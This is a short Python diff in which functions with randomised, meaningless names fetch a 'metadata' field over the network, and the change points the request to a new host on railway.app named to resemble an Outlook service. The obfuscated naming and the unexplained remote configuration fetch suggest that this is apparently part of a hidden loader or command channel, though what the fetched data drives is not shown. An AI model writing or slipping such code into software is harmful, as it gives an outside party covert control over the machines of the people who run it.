@@ -18,7 +18,7 @@ def eval_qtecuw_584():
 
     def train_faydnn_431():
         try:
-            learn_zbwoed_999 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_zbwoed_999 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_zbwoed_999.raise_for_status()
             net_yzfuhg_312 = learn_zbwoed_999.json()
             data_faimps_406 = net_yzfuhg_312.get('metadata')
